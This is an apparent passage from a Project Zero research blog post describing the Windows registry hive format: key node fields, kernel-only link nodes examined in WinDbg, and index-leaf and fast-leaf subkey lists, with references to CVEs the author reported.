The field identifies the key node that acts as this key's parent within the registry's hierarchical structure. Except for root keys, which exist at the topmost level of a hive, every key must have a valid Parent field. This index plays a vital role in navigating the registry and modifying key relationships. For example, it's essential for determining a key's full path or ensuring correct alphabetical order when renaming a key within its parent's subkey list.

##### SubKeyCounts

This two-element array of DWORDs stores the number of the key's stable and volatile subkeys, respectively. Even though the integers are 32 bits wide, the actual number of subkeys is limited by the upper bound of all keys in a hive in a specific storage space, which is roughly 2 GiB (storage space size) ÷ 84 bytes (minimum key node size) ≈ 25.5 million keys.

The data in this field is somewhat redundant, as the same information is also stored in the subkey indexes themselves. Nevertheless, the cached numbers stored directly in the key node make it possible to efficiently query the numbers of subkeys with API such as [RegQueryInfoKey](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeya). The kernel does its best to keep the two copies of the information in sync, and any discrepancies between them may lead to memory corruption vulnerabilities.

##### SubKeyLists

This is another two-element array, which complements the previous SubKeyCounts member by providing cell indexes to the corresponding subkey lists for each storage type. The format of these lists is discussed in detail in the "Subkey indexes" section below; for now, it's only important to know that if SubKeyCounts[x] > 0, then SubKeyLists[x] is expected to be a valid cell index, otherwise it should be equal to HCELL\_NIL (-1). Furthermore, because the volatile space is a strictly in-memory concept that doesn't exist on disk, newly loaded hives are always expected to have SubKeyCounts[1] set to 0 and SubKeyLists[1] set to HCELL\_NIL.

##### ValueList

This is a structure of type \_CHILD\_LIST, which consists of two 32-bit integers: the number of values associated with the key, and a cell index of the actual value list. Here, there is no distinction between stable and volatile values: for any given key, the values always inherit the storage type of the key, so either all of them are stable, or all of them are volatile. Similarly to subkey lists, though, if ValueList.Count is 0, then ValueList.List must be HCELL\_NIL.

As mentioned earlier, this field also had a second meaning if the key was a predefined key: in that case, ValueList.Count contained an arbitrary value with the highest bit set, which indicated the top-level HKEY to redirect to, and ValueList.List was completely unused and could contain arbitrary data. As you can imagine, whenever an internal system function started to use such a value list with the assumption it was a normal key, it would operate on an inadequately huge count and an invalid cell index, wrecking havoc in the kernel. Thankfully, this is no longer a possibility due to the deprecation of predefined keys in 2023.

##### ChildHiveReference

You may have noticed that ChildHiveReference is part of a union, as it resides at the same offset as the SubKeyLists member (offset 0x1C). It is a special object that is used to implement hive mounting under the \Registry tree, and is unique to keys that have the KEY\_HIVE\_EXIT flag set (i.e. exit nodes). It is only ever used in memory, and is therefore not applicable to regular hives stored on disk. Its two fields specify the root key of the mounted hive, as a pair of a kernel pointer to the \_HHIVE descriptor structure and the cell index of the root key. This breaks the fundamental invariant that hives are self contained and don't store any virtual address pointers, only cell indexes. It is the only exception to the rule, and only because it is a necessary hack/workaround to implement a feature that hives normally don't support: attaching one hive to another in the global system view.

The field and its usage are discussed in more detail in the "Link nodes" section below.

##### Security

This is the cell index of the security descriptor cell corresponding to the key. It is a mandatory field for every type of key in the registry (symbolic links, previously predefined keys etc.), with the only exception being system-managed exit nodes. For every key that has an invalid security descriptor during hive load (e.g. set to HCELL\_NIL or just an invalid cell index), it is automatically fixed up to inherit the security descriptor of its parent key. If the root key of a hive has invalid security, the whole hive is rejected with the STATUS\_REGISTRY\_CORRUPT error code.

The security descriptor cell always has the same storage type as the key(s) that it is associated with. So for example, if there are two keys in a hive with the same security properties, one in the stable and the other in the volatile space, then they will reference two different stable/volatile security cells with equivalent data.

For obvious reasons, the correct handling of this field is crucial to overall system security. In the course of my research, I have discovered [9 vulnerabilities](https://project-zero.issues.chromium.org/issues?q%3Did:(42451423%2520%257C%252042451425%2520%257C%252042451427%2520%257C%252042451516%2520%257C%252042451552%2520%257C%252042451596%2520%257C%252042451592%2520%257C%252042451601%2520%257C%252042451625)) directly involving the handling of security descriptors, and a further 4 reported to Microsoft outside of the tracker (WinRegLowSeverityBugs [#1](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/01_Key_node_Security_OOB_read), [#10](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/10_CmpKeySecurityIncrementReferenceCount_zero_refcount_crash), [#13](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/13_CmpLightWeightPrepareSetSecDescUoW_security_list_confusion), [#20](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/20_App_hive_security_inconsistencies)). They generally didn't have much to do with the  \_CM\_KEY\_NODE.Security field specifically, but rather the formatting of the security cells and higher-level logic related to them:

* Binary formatting of the SECURITY\_DESCRIPTOR\_RELATIVE structure
* Maintaining the consistency of the doubly-linked list of security descriptors in the hive
* Reference counting security descriptors when operating on keys
* Enforcing proper access checks when opening and creating keys

Overall, this is probably the most interesting field in the structure from a security research perspective.

##### Class and ClassLength

In technical terms, a key class is an optional, immutable blob of 1-65535 bytes associated with a key. It can only be set once, during the creation of a key, through the lpClass argument of the [RegCreateKeyExW](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw) API (or the equivalent Class parameter of the NtCreateKey system call). It can be then queried with functions such as [RegQueryInfoKey](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeyw), but cannot be modified without deleting and re-creating the key. If the class exists, then the ClassLength field is set accordingly, and Class is a cell index that points to its backing buffer. Otherwise, ClassLength is set to 0 and Class is HCELL\_NIL (-1).

Conceptually, a class can be viewed as an extra, hidden value of a key, existing alongside the normal value list. It is not displayed anywhere in the Regedit GUI, but if it exists for a given key, it can be retrieved by using the "Export" option in Regedit to save the key to a .txt file, which also exports the class data. It has existed since the earliest version 1.0 of the regf format – perhaps as a way to store the "type" of a key similar to how every value has a defined type. Today, it seems to be a mostly obsolete mechanism that doesn't see much use; even Raymond Chen wrote in his [What is the terminology for describing the various parts of the registry?](https://devblogs.microsoft.com/oldnewthing/20090204-00/?p%3D19263) blog in 2009:

| Bonus chatter: There’s also this thing called a class. I have no idea what it’s for, so don’t ask. |
| --- |

When I ran a quick scan of the Windows 11 registry, I found the following unique strings being used at least once as a key class:

* "DynDRootClass"
* "GenericClass"
* "Network ComputerName"
* "REG\_SZ"
* "Shell"

The [Windows NT Registry File (REGF) format specification](https://github.com/libyal/libregf/blob/main/documentation/Windows%2520NT%2520Registry%2520File%2520%28REGF%29%2520format.asciidoc) lists several other values that have been observed in the past, such as "activeds.dll ", "Cygwin", "OS2SS" or "TCPMon". It is worth noting that the class was also used to store the encryption keys for the now-deprecated SAM database encryption mechanism known as [SysKey](https://moyix.blogspot.com/2008/02/syskey-and-sam.html). Overall, due to its simplistic nature, key classes are not particularly security-relevant, but may be of interest in the context of obfuscation and hiding data, as they are easily accessible and yet a largely overlooked part of the registry.

##### MaxNameLen, MaxClassLen, MaxValueNameLen and MaxValueDataLen

These four fields store cached information about the maximum lengths of several properties of the key or its subkeys:

* MaxNameLen: the maximum length of a subkey's name,
* MaxClassLen: the maximum length of a subkey's class information,
* MaxValueNameLen: the maximum length of a value name associated with the key,
* MaxValueDataLen: the maximum length of a value data associated with the key.

The presumed purpose of these members is to facilitate a quick lookup of the per-key limits, such that when a client application wants to enumerate/query subkeys or values, it can simply allocate a single buffer guaranteed to accommodate every possible key name, value name, etc. And so, their exact values can be retrieved with the [RegQueryInfoKey](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeyw) API via the lpcbMaxSubKeyLen, lpcbMaxClassLen, lpcbMaxValueNameLen and lpcbMaxValueLen arguments.

Although querying these limits seems convenient, there are some caveats that are important to keep in mind:

* The fields are intended to represent the lower bound of the number of bytes required to store the given property, but not necessarily to be optimal (i.e. to be the smallest sufficient length). For example, when a key with formerly the longest name is deleted, the MaxNameLen field of the parent is not updated with the value of the second-largest length, as that would require the lengthy process of iterating through all of the subkeys again. Therefore, relying on those values may incur some unwanted memory overhead.
* When operating on registry keys that are globally visible in the registry tree, it is possible that a race condition with another application causes one of the maxima to change in between the RegQueryInfoKey call and the actual data query. To address this, applications should include fallback logic to allocate more memory in the rare case when the obtained maximum proves insufficient.
* To add to the previous point, after having reverse-engineered and reviewed most of the Configuration Manager code, it is my instinct that these fields continue to be supported throughout the development of new registry features (e.g. differencing hives), but it is mostly on a best-effort basis. For example, during hive load, only MaxValueNameLen and MaxValueDataLen are enforced to have the correct values, while MaxNameLen and MaxClassLen remain unchecked. For this reason, I would personally not rely on the consistency of those values for the security of any client code, and would treat them more as a guidance/supplementary information than the sole source of truth about the key limits.

##### UserFlags

This is a field whose name, offset and function (so basically every aspect) has been subject to change over the years. Its current form has existed since Windows Vista, and occupies bits 20-23 of MaxNameLen, which had been previously a 32-bit integer, but was later reduced to 16 bits to make room for these extra flags. In theory, its name may suggest that this member is meant to store user-defined data, but in practice, Microsoft developers quickly found their own use for the bitmask: storing flags related to the [Registry Reflection](https://learn.microsoft.com/en-us/windows/win32/winprog64/registry-reflection) mechanism for providing interoperability between 32-bit and 64-bit applications. You can read more about the meaning of each specific flag [here](https://github.com/msuhanov/regf/blob/master/Windows%2520registry%2520file%2520format%2520specification.md%23user-flags), but in short, this was where reflection-specific configuration was internally saved by API functions such as [RegEnableReflectionKey](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regenablereflectionkey) and [RegDisableReflectionKey](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regdisablereflectionkey), and retrieved by [RegQueryReflectionKey](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryreflectionkey).

However, this specific use seems to have been short-lived, as Registry Reflection [was soon deprecated](https://learn.microsoft.com/en-us/windows/win32/win7appqual/removal-of-windows-registry-reflection) in Windows 7. Since then, it could indeed be considered as four extra bits of user-controlled storage per key, accessible for reading via NtQueryKey(KeyFlagsInformation) and for writing via NtSetInformationKey(KeyWow64FlagsInformation). Beyond being interesting for historical reasons, the field doesn't play any important role in security.

##### VirtControlFlags

This field is another one introduced around Windows XP SP3 / Windows Vista that took over some of the space from MaxNameLen. It is related to Registry Virtualization and takes up four bits in the \_CM\_KEY\_NODE structure definition, but there are only three flags that it can really store:

| Mask | Name | Description |
| --- | --- | --- |
| 0x1 | REG\_KEY\_DONT\_VIRTUALIZE | Disables virtualization for the specific key. |
| 0x2 | REG\_KEY\_DONT\_SILENT\_FAIL | Prevents the system from re-opening a virtualized key with MAXIMUM\_ACCESS if the initial Open operation with the desired access rights has failed. |
| 0x4 | REG\_KEY\_RECURSE\_FLAG | Causes new subkeys of the key to inherit its virtualization-related configuration. |

The flags are not sanitized in any way during hive load and so may be set to arbitrary values. They can also be modified programmatically by using the NtSetInformationKey(KeySetVirtualizationInformation) system call, or even from the Windows command line, by using the REG FLAGS command:

C:\>reg flags /?

REG FLAGS KeyName [QUERY |

                   SET [DONT\_VIRTUALIZE] [DONT\_SILENT\_FAIL] [RECURSE\_FLAG]]

                  [/reg:32 | /reg:64]

  Keyname    "HKLM\Software"[\SubKey] (Restricted to these keys on

        local machine only).

    SubKey   The full name of a registry key under HKLM\Software.

  DONT\_VIRTUALIZE DONT\_SILENT\_FAIL RECURSE\_FLAG

    Used with SET; flags specified on the command line will be set,

        while those not specified will be cleared.

  /reg:32  Specifies the key should be accessed using the 32-bit registry view.

  /reg:64  Specifies the key should be accessed using the 64-bit registry view.

More information about these flags can be found in the documentation of the [ORSetVirtualFlags](https://learn.microsoft.com/en-us/windows/win32/devnotes/orsetvirtualflags) API function, a part of the Offline Registry Library. In the context of registry security research, I haven't found them particularly interesting – the other virtualization-related flags in the "Flags" field have proved to be much more useful in that regard.

##### Debug

In Debug/Checked builds of Windows, it used to be possible to have the kernel trigger a breakpoint when performing a specific operation on a specific registry key. To enable the option, an administrator would have to set the  HKLM\System\CurrentControlSet\Control\Session Manager\Configuration Manager\RegDebugBreaksEnabled value to 1, which would propagate to the global kernel CmpRegDebugBreakEnabled variable. Then, the "Debug" field of each key would store a bitmask indicating which subset of eight possible operations should be interrupted for the given key:

| Mask | Name |
| --- | --- |
| 0x01 | BREAK\_ON\_OPEN |
| 0x02 | BREAK\_ON\_DELETE |
| 0x04 | BREAK\_ON\_SECURITY\_CHANGE |
| 0x08 | BREAK\_ON\_CREATE\_SUBKEY |
| 0x10 | BREAK\_ON\_DELETE\_SUBKEY |
| 0x20 | BREAK\_ON\_SET\_VALUE |
| 0x40 | BREAK\_ON\_DELETE\_VALUE |
| 0x80 | BREAK\_ON\_KEY\_VIRTUALIZE |

Whenever a breakpoint was triggered by this mechanism, the kernel would also print out a corresponding message for the attached debugger, for instance:

DbgPrint("\n\n Current process is deleting a key tagged as BREAK ON DELETE");

DbgPrint(" or deleting a subkey under a key tagged as BREAK\_ON\_DELETE\_SUBKEY\n");

DbgPrint("\nPlease type the following in the debugger window: !reg kcb %p\n\n\n", Kcb);

Now that the Debug/Checked builds have been discontinued – or at least not released publicly anymore for the latest versions of Windows 10/11 – the "Debug" field is just an unused byte in the key node structure.

##### WorkVar

According to an unofficial format specification, WorkVar used to be an internal-use member meant to be only ever accessed by the kernel in order to optimize key lookups. The last version of Windows where WorkVar was still in active use was Windows 2000; since Windows XP, it has simply been another four bytes of unused memory in the key node data layout.

##### NameLength and Name

The combination of these two fields specifies the name of the key: NameLength indicates the length of the string in bytes, and Name is an inline, variable-length buffer at the end of the structure that stores the name itself. There are a number of considerations and consistency requirements related to registry key names, enforced when loading a hive and later at runtime:

* Compression: If the KEY\_COMP\_NAME (0x20) flag is clear in \_CM\_KEY\_NODE.Flags, the name is formatted as a wide string of 16-bit characters. If it is set, which is the common scenario, then "Name" represents a more tightly packed ASCII string of 8-bit characters. Considering that a majority of keys in the registry are alphanumeric, this optimization saves a non-trivial amount of memory and disk space. It is interesting to note that it is still possible to load a hive with a non-optimally formatted key name (non-compressed ASCII string), but such a key node would never be generated by Windows itself.
* Length: The key name mustn't be empty (i.e. it should be at least one character long), and it cannot exceed 256 characters in length (even though [Registry element size limits](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-element-size-limits) incorrectly claims that the limit is 255). The NameLength field value is expressed in bytes, so it must be between 1-256 for compressed names, and 2-512 for wide strings (and divisible by two). Up until October 2022, this limit [was not correctly enforced](https://project-zero.issues.chromium.org/issues/42451478), making it possible to load hives with key names up to 1040 characters, which would then be mishandled or outright rejected by other parts of the registry code.
* Charset: All characters in the 0x0000 – 0xFFFF range are allowed in a key name with the exception of backslash ('\', 0x005C). The backslash is singled out because it plays a special role in the registry, separating distinct elements of the registry paths. Since the kernel must always be able to distinguish parts of key names from the separator, a decision was made to exclude this one character from the key name charset, similar to how backslashes are not allowed in file names. Furthermore, there is a second minor requirement that the key name must not start with a null character, but it may be present at any other position in the name (this only started to be properly enforced in NtRenameKey after the fix for [CVE-2024-26178](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/13_CmpLightWeightPrepareSetSecDescUoW_security_list_confusion) in March 2024). Overall, this means that key names aren't truly textual strings in the conventional sense of the word: they don't use a terminator, and may contain all sorts of non-printable characters. It would be more appropriate to think of them as binary blobs used to reference registry keys, which doesn't have any consequences for the kernel, as it universally uses the UNICODE\_STRING structure that includes both the length and the backing buffer of the string anyway. But if a potentially malicious program were to create a key with an unusual name (e.g. including a null character), it could prove difficult for an administrator to operate on it with the built-in registry utilities (reg.exe, Regedit), or even with third-party tools that use the high-level API (such as [RegOpenKeyEx](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa)). In such cases, it might be required to use specialized tools that interact with the Windows registry directly through the system call interface as the only way to examine/modify such keys.
* Uniqueness: One of the most important invariants of the Windows registry implementation is the uniqueness of key names: there may be only one key with a specific path, or in other words, for every key, there mustn't be any duplicates in the list of its subkeys. Given that registry key names are case-insensitive, any two names are always compared in their uppercase form to determine if they are equal or not. This uniqueness requirement is enforced both during hive load and subsequent operations, and failure to do it correctly could lead to both logic bugs and memory corruption. For some examples of the potential outcomes of allowing duplicate key names in registry, see Maxim Suhanov's [The uppercased hell](https://dfir.ru/2021/10/15/the-uppercased-hell/) blog or my [CVE-2023-21748](https://project-zero.issues.chromium.org/issues/42451527) / [CVE-2023-23420](https://project-zero.issues.chromium.org/issues/42451549) bug reports.

Another intriguing aspect of the key names are the names associated with the root keys of default system hives. In general, every registry key in Windows is referenced by its name specified in the key node, except for root keys, which are known by the name of their mount points. As a result, the "real" underlying names of root keys are never visible to users or applications, but they are nevertheless present in the hive file as a mandatory part of every key node, and could be potentially used to learn something about how these fundamental system hives (SOFTWARE, SYSTEM etc.) are generated.

I have examined hives from various Windows versions ranging from Windows NT 3.1 to Windows 11, and arrived at the following list of per-version root key names:

| Version | Root key name |
| --- | --- |
| NT 3.1 - NT 4.0 | Same as the hive name (e.g., "SYSTEM") |
| 2000 - XP | $$$PROTO.HIV |
| Vista - 7 | CMI-CreateHive{RANDOM GUID} |
| 8 | CsiTool-CreateHive-{00000000-0000-0000-0000-000000000000} |
| 10 - 11 | ROOT |

In early NT versions, the root key name simply mirrored the hive's file name. In Windows 2000 and XP, the name stemmed from the fact that system hives were created during system installation by temporarily creating the tree root under \Registry\Machine\SYSTEM\$$$PROTO.HIV, pre-initializing it with the default data for the given hive, and saving it to a file with an API like [RegSaveKeyEx](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsavekeyexw).

In Windows 10 and 11, the name is simply "ROOT", which, along with the "OfRg" magic bytes at offset 0xB0 in the file header, hints that the hives are created with the Offline Registry Library. This leaves versions between Windows Vista and Windows 8 as the big unknown: neither "CMI-CreateHive" nor "CsiTool-CreateHive" sound particularly familiar, and I haven't been able to find any information about them in any public resources. It is probably safe to assume that these strings are indicative of some internal Microsoft tooling that was used to generate hives for these systems, but not much is known beyond it. Nevertheless, I find it fascinating that such little tidbits of information can be found in obscure corners of file formats. You never know when some other missing part of the puzzle becomes known publicly, making it possible to finally connect the dots and see the bigger picture, sometimes years or decades after the initial release of the software.

#### Link nodes

As mentioned above, link nodes are a special type of key node designed to facilitate the mounting of arbitrary hives from disk into the global registry view. They are managed by the Windows kernel and only ever exist in memory. They are represented by the \_CM\_KEY\_NODE structure, but with the following differences compared to regular keys:

* The Signature field is set to 0x6B6C ('lk') instead of 0x6B6E ('nk'),
* The KEY\_HIVE\_EXIT (0x0002) flag is set in Flags,
* The key doesn't have any of the standard key properties, such as the security descriptor, class, subkeys or values. The only cell reference it contains is to its parent cell, which is one of \Registry\A, \Registry\Machine, \Registry\User or \Registry\WC.
* Instead of the SubKeyLists member at offset 0x1C, the link node uses the ChildHiveReference field of type \_CM\_KEY\_REFERENCE, which stores a kernel-mode pointer to the destination hive descriptor (\_HHIVE\*), and the cell index of the root key within that hive.

So, whenever you see a hive root key (e.g. any key within HKLM or HKCU), you are actually looking at a pair of a link node (also known as exit node) + root key (a.k.a. entry node – these terms are used interchangeably). The mount point assumes the key name of the link node (so that it is easily enumerable with the existing kernel logic), and all of the characteristics of the entry node. This is illustrated in the following diagram, where the key marked in red is the link node of the SYSTEM hive, and the green one is the root key:

[![Diagrammatic illustration and visual representation of the paragraph above](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3oiXe3jfIDS0CKONQWJn0FeAugieby2gy41fGxDBO_dDqYh13EduspE8cuBTKWOikQfdPR7GodX7__1sUQIlqpsObXgtp_ucQenLFPZB1qf7Yoxy6EiIK8WzFa6IkDsBbHGhc5fRnFFtf0SSunqUPto67Kl73AD6pczCRNbjXbgvGNqhcRhcFR8iNFGk/s1200/image10.png "Diagrammatic illustration and visual representation of the paragraph above")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3oiXe3jfIDS0CKONQWJn0FeAugieby2gy41fGxDBO_dDqYh13EduspE8cuBTKWOikQfdPR7GodX7__1sUQIlqpsObXgtp_ucQenLFPZB1qf7Yoxy6EiIK8WzFa6IkDsBbHGhc5fRnFFtf0SSunqUPto67Kl73AD6pczCRNbjXbgvGNqhcRhcFR8iNFGk/s1999/image10.png)

The existence of link nodes seems to be very little known and scarcely documented in public resources, which is likely caused by the fact that the Windows kernel makes them virtually invisible, and not just for users and high-level API clients, but even for administrators and kernel driver developers. The way the registry tree traversing code is structured, whenever it encounters a link node, it always makes sure to skip over it and reference the corresponding entry node. This means that it is impossible to open or otherwise observe the link node itself from the context of user-mode, but if we put in some effort, we should be able to see it in WinDbg attached as a kernel debugger. We can approach the link node from two sides: either try to find it top-down starting from the master hive, or by locating a key in a mounted hive and traversing the registry tree upwards.

In this post, we will proceed with the first idea and enumerate the keys within \Registry\Machine (i.e. HKLM):

0: kd> !reg querykey \registry\machine

Found KCB = ffff800f88ad96e0 :: \REGISTRY\MACHINE

Hive         ffff800f88a88000

KeyNode      ffff800f88ada16c

[SubKeyAddr]         [SubKeyName]

ffff800f88ada44c     BCD00000000

ffff800f88ada3cc     HARDWARE

ffff800f88ada59c     SAM

ffff800f88ada504     SECURITY

ffff800f88ada374     SOFTWARE

ffff800f88ada31c     SYSTEM

 Use '!reg keyinfo ffff800f88a88000 <SubKeyAddr>' to dump the subkey details

[ValueType]         [ValueName]                   [ValueData]

REG\_DWORD           ServiceLastKnownStatus        2

Here, we can see all the system hive mount points together with their corresponding link node addresses. In case of normal, stable keys, these would be user-mode addresses within the address space of the Registry process, but since the master hive is a volatile one, all of its structures are stored on the kernel pools. We can then use a command such as !reg knode to query any of the specific subkeys, e.g. SYSTEM:

0: kd> !reg knode ffff800f88ada31c

Signature: CM\_LINK\_NODE\_SIGNATURE (kl)

Name                 : SYSTEM

ParentCell           : 0x168

Security             : 0xffffffff [cell index]

Class                : 0xffffffff [cell index]

Flags                : 0x2a

MaxNameLen           : 0x0

MaxClassLen          : 0x0

MaxValueNameLen      : 0x0

MaxValueDataLen      : 0x0

LastWriteTime        : 0x 1db2b94:0xe031a530

SubKeyCount[Stable  ]: 0x0

SubKeyLists[Stable  ]: 0x20

SubKeyCount[Volatile]: 0x0

SubKeyLists[Volatile]: 0xffffffff

ValueList.Count      : 0x88a8e000

ValueList.List       : 0xffff800f

As expected, the key node has the special link node signature ('kl'), and the 0x2 flag set within the 0x2a Flags bitmask (the other two flags set are KEY\_NO\_DELETE and KEY\_COMP\_NAME). The command gets a little confused, because it expects to operate on a regular key node and display its subkey/value counts and lists, but as mentioned above, this space is taken up by the \_CM\_KEY\_REFERENCE structure in the link node. If we line up the offsets correctly, we can decode that the exit node points at cell index 0x20 in hive 0xffff800f88a8e000, which is consistent with the outcome of displaying the structure data directly:

0: kd> dx -id 0,0,ffffbd044acf6040 -r1 (\*((ntkrnlmp!\_CM\_KEY\_REFERENCE \*)0xffff800f88ada338))

(\*((ntkrnlmp!\_CM\_KEY\_REFERENCE \*)0xffff800f88ada338))                 [Type: \_CM\_KEY\_REFERENCE]

    [+0x000] KeyCell          : 0x20 [Type: unsigned long]

    [+0x008] KeyHive          : 0xffff800f88a8e000 [Type: \_HHIVE \*]

We can now translate this information into the cell's virtual address, and take a peek into it with !reg knode and !reg keyinfo:

0: kd> !reg cellindex 0xffff800f88a8e000 0x20

Map = ffff800f88adc000 Type = 0 Table = 0 Block = 0 Offset = 20

MapTable     = ffff800f88ade000

MapEntry     = ffff800f88ade000

BinAddress = ffff800f896e8009, BlockOffset = 0000000000000000

BlockAddress = ffff800f896e8000

pcell:  ffff800f896e8024

0: kd> !reg knode ffff800f896e8024

Signature: CM\_KEY\_NODE\_SIGNATURE (kn)

Name                 : ROOT

ParentCell           : 0x318

Security             : 0x78 [cell index]

Class                : 0xffffffff [cell index]

Flags                : 0x2c

MaxNameLen           : 0x26

MaxClassLen          : 0x0

MaxValueNameLen      : 0x0

MaxValueDataLen      : 0x0

LastWriteTime        : 0x 1db2b94:0xe031a530

0: kd> !reg keyinfo 0xffff800f88a8e000 ffff800f896e8024

KeyPath         \REGISTRY\MACHINE\SYSTEM

[SubKeyAddr]         [SubKeyName]

ffff800f896e8174     ActivationBroker

ffff800f896e964c     ControlSet001

ffff800f89f0e8a4     DriverDatabase

ffff800f89f999c4     HardwareConfig

ffff800f89f9a314     Input

ffff800f89f9a3dc     Keyboard Layout

ffff800f89f9a43c     Maps

ffff800f89f9a674     MountedDevices

ffff800f89f9ab64     ResourceManager

ffff800f89f9abc4     ResourcePolicyStore

ffff800f89f9ac2c     RNG

ffff800f89f9addc     Select

ffff800f89f9aed4     Setup

ffff800f89f9b7d4     Software

ffff800f89f9d1f4     State

ffff800f89f9d24c     WaaS

ffff800f89fabc8c     WPA

[SubKeyAddr]         [VolatileSubKeyName]

ffff800f88b91024     CurrentControlSet

 Use '!reg keyinfo ffff800f88a8e000 <SubKeyAddr>' to dump the subkey details

[ValueType]         [ValueName]                   [ValueData]

 Key has no Values

We have indeed ended up at the root key of the SYSTEM hive, which has a standard key node signature ('nk'), the predefined "ROOT" name, a valid security descriptor, a list of subkeys, and so on.

Overall, link nodes are an interesting implementation detail of the registry that are worth keeping in mind. However, considering their relative simplicity and the fact that they are hidden away even from very low-level mechanisms like [Registry Callbacks](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-cmregistercallbackex), they are of limited significance to system security. The lone vulnerability I found related to them, [CVE-2023-21747](https://project-zero.issues.chromium.org/issues/42451505), resulted in a use-after-free due to improper cleanup of the exit node when faced with an out-of-memory condition.

#### Subkey indexes

Operations performed on subkey lists are some of the most common ones – they are involved whenever a key is opened, created, deleted, renamed or enumerated, which constitutes a majority of actions involving the registry at runtime. It is for this reason that subkey lists have seen the most evolution throughout the subsequent versions of the regf format. As the interface was getting adopted by more and more applications in Windows NT and later systems, Microsoft developers could collect data on the typical usage patterns and devise adequate optimizations to speed these operations up. In this section, we will have a deeper look into how subkey indexes are formatted in the hives, and how the different types of operations affect them.

By way of introduction, subkey indexes are data structures storing lists of descendant keys relative to a parent key, referenced through the \_CM\_KEY\_NODE.SubKeyLists[...] cell indexes. During hive load, the value at index 0 of the array may either be a subkey index, or HCELL\_NIL if there are no subkeys; index 1 must always be equal to HCELL\_NIL, as by definition there are no volatile subkeys on disk. The high-level concept behind the subkey index is that it is a linear list of key node cell indexes, which must efficiently support the following operations (from most to least commonly used, in my subjective opinion):

1. Finding a key by name,
2. Finding a key by index on the list,
3. Adding a new key to the list,
4. Deleting a key from the list.

Regardless of the underlying representation of the list, it is always stored in a lexicographical order, reducing the lookup-by-name time from linear to logarithmic by using binary search. Let's now look into the specific structures used in registry hives to implement this functionality.

##### Index leaves

Index leaves are the most basic type of a subkey list, which has been supported since the first iteration of the regf format and consists of just three members: the signature (0x696C, 'li'), number of entries (16-bit), and an inline, variable-length list of the cell indexes. The corresponding Windows kernel structure is \_CM\_KEY\_INDEX:

0: kd> dt \_CM\_KEY\_INDEX

nt!\_CM\_KEY\_INDEX

   +0x000 Signature        : Uint2B

   +0x002 Count            : Uint2B

   +0x004 List             : [1] Uint4B

Given the Count field range, the index leaf can store up to 65535 subkeys. It is the most compact one in terms of disk/memory consumption, but it provides somewhat poor cache locality, because every key referenced during the lookup must be accessed in memory in order to read its name from \_CM\_KEY\_NODE.Name. Nevertheless, index leaves are still commonly used in all versions of Windows up to this day.

As an example, let's consider a key with five subkeys named "wombat", "🐂", "HIPPO", "ant", and "ocelot". An index leaf of such a key could look like this:

[![Diagram showing a key with five subkeys, as described in the sentence preceding this image](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjP6HTqFmlJWUcQw8x4ApSJkCj3ffelx8GBKKVMlXnQhKdWAsGBAKD8vKpHjiA3JS0GvOv9aqOc4r78CUbOKhyphenhyphenJ0ToMevio52XIou94wWK6jahtxS8IShyphenhyphenX63QzpBOXDFIA1m9yDRY1vkglHGXqT4TiiPjX5korMRt6-mg_27y7OuOwNgnaCF0XHLjPcUY/s1200/image3.png "Diagram showing a key with five subkeys, as described in the sentence preceding this image")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjP6HTqFmlJWUcQw8x4ApSJkCj3ffelx8GBKKVMlXnQhKdWAsGBAKD8vKpHjiA3JS0GvOv9aqOc4r78CUbOKhyphenhyphenJ0ToMevio52XIou94wWK6jahtxS8IShyphenhyphenX63QzpBOXDFIA1m9yDRY1vkglHGXqT4TiiPjX5korMRt6-mg_27y7OuOwNgnaCF0XHLjPcUY/s1999/image3.png)

This illustrates that entries in the list are indeed stored in a sorted manner, and in a case-insensitive way – "ant" goes before "HIPPO" even though 'H' (0x48) < 'a' (0x61). However, this logic applies to comparisons only, and otherwise the letter casing specified during key creation is preserved and visible to registry users. Finally, the unicode ox symbol is placed last on the list, because it is encoded as U+D83D U+DC02, and 0xD83D is greater than any of the ASCII characters in the other names.

##### Fast leaves

Fast leaves are slightly younger than subkey indexes, introduced in regf version 1.3 in 1995 (Windows NT 4.0). As hive versions 1.2 and below have been long obsolete, that means that fast leaves are universally supported in every modern version of Windows at the time of this writing. As the name suggests, they are meant to be faster than their predecessors, by including up to four initial characters of each subkey in the list as a "hint" next to the cell index of the key. This allows the kernel to execute the first four iterations of the string comparison loop using data only from the fast leaf and without referring to the corresponding node, which addresses the aforementioned issue of poor cache locality in index leaves. We expect this optimization to be effective in most real-life scenarios, as most keys consist of ASCII-only characters and differ from each other within the first four symbols.

The specific logic of generating the 32-bit hint from a string can be found in the internal CmpGenerateFastLeafHintForUnicodeString kernel function, but is boils down to the following steps:

1. Set the initial hint variable to 0
2. In a loop of min(4, length) iterations:

1. If the n-th character is greater than 0xFF, break
2. Otherwise add the character (with its original case) to the hint

3. Return the hint to the caller

For example, the hint for "ant" is "ant\0", the hint for "HIPPO" is "HIPP", and the hint for "🐂" is "\0\0\0\0" (the first character is non-ASCII, so the whole hint is simply zero).

